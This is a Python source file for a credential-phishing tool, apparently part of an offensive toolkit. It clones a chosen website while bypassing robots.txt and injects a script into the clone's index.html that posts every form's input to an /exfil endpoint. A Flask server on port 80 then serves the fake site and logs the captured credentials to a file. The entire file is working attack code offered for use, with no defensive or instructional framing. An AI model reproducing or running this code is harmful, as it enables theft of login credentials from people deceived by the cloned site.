import os
import threading
from flask import Flask, request
from pywebcopy import save_webpage
from rich.console import Console

console = Console()
app = Flask(__name__)


@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.form.to_dict()
    console.print(f"[bold red][!] CREDENTIALS HARVESTED:[/bold red] {data}")
    if not os.path.exists("logs"):
        os.makedirs("logs")
    with open("logs/harvested.txt", "a") as f:
        f.write(f"{data}\n")
    return "OK", 200


def run_server(path):
    os.chdir(path)
    # Serves the clone and the API on port 80
    app.run(host='0.0.0.0', port=80, debug=False)


def clone_site():
    target_url = console.input(
        "[bold yellow]Target URL to Clone: [/bold yellow]").strip()
    project = console.input(
        "[bold yellow]Project Name: [/bold yellow]").strip()
    base_path = "/opt/davoid/clones"

    save_webpage(url=target_url, project_folder=base_path,
                 project_name=project, bypass_robots=True)

    # Injected Hook: Steals input data on change
    hook = "<script>document.querySelectorAll('input').forEach(i => i.addEventListener('change', () => { fetch('/exfil', {method:'POST', body:new FormData(document.querySelector('form'))}) }))</script>"

    # Find index.html to inject hook
    for root, dirs, files in os.walk(os.path.join(base_path, project)):
        if "index.html" in files:
            with open(os.path.join(root, "index.html"), "a") as f:
                f.write(hook)
            break

    if console.input("\n[bold cyan]Start Harvest Server? (y/N): [/bold cyan]").lower() == 'y':
        project_path = os.path.join(
            base_path, project, target_url.split('//')[-1])
        threading.Thread(target=run_server, args=(
            project_path,), daemon=True).start()
        console.print(
            f"[bold green][+] Portal active. Logs: logs/harvested.txt[/bold green]")
        input("Press Enter to stop...")
